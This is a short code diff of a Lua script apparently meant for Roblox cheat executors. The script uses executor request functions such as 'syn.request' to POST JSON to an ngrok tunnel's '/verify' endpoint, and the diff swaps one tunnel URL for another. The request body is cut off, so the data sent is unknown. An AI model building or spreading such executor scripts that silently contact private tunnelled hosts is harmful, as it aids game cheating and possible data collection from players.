@@ -1,4 +1,3 @@
-repeat wait() until game:IsLoaded() and game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer.Character
 local function httpRequest(data)
     if syn and syn.request then
         return syn.request(data)
@@ -15,7 +14,7 @@ local function httpRequest(data)
 end
 pcall(function()
     local response = httpRequest({
-        Url = "https://445c-1-10-219-103.ngrok-free.app/verify",
+        Url = "https://learning-eagerly-dassie.ngrok-free.app/verify",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = game:GetService("HttpService"):JSONEncode({
